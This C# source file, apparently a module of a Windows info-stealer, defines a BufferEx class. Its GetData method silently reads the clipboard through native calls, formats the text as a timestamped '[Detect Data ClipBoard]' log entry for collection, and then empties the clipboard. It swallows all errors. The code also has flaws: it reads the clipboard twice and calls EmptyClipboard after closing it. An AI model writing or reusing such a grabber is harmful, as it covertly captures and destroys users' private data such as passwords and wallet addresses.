namespace DuplexMemory
{
    using System;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Windows.Forms;

    public static class BufferEx
    {
        /// <summary>
        /// Метод для получения данных из буфера обмена в памяти
        /// </summary>
        /// <returns></returns>
        public static byte[] GetData()
        {
            using var memoryStream = new MemoryStream();
            try
            {
                // Проверка буфера на текст с размером больше 5 строк
                if (Clipboard.ContainsText() && Inizialize.Length > 5)
                {
                    string MyText = $"[Detect Data ClipBoard] - [ {DateTime.Now:MM.dd.yyyy - HH:mm:ss}]\r\n==================================================\r\n{Inizialize}\r\n==================================================\r\n";
                    byte[] stringToBytes = Encoding.UTF8.GetBytes(MyText);
                    memoryStream.Position = 0;
                    memoryStream.Write(stringToBytes, 0, stringToBytes.Length);
                }
            }
            catch { }
            return memoryStream?.ToArray() ?? null;
        }

        private const uint CF_UNICODETEXT = 13;
        private static string Inizialize
        {
            get
            {
                if (!NativeMethods.IsClipboardFormatAvailable(CF_UNICODETEXT) || !NativeMethods.OpenClipboard(IntPtr.Zero)) return null;

                string result = string.Empty;
                IntPtr hGlobal = NativeMethods.GetClipboardData(CF_UNICODETEXT);
                if (hGlobal != IntPtr.Zero)
                {
                    IntPtr lpwcstr = NativeMethods.GlobalLock(hGlobal);
                    if (lpwcstr != IntPtr.Zero)
                    {
                        try
                        {
                            result = Marshal.PtrToStringUni(lpwcstr);
                            NativeMethods.GlobalUnlock(lpwcstr);
                        }
                        catch { }
                    }
                }
                NativeMethods.CloseClipboard();
                NativeMethods.EmptyClipboard();
                return result;
            }
        }
    }
}
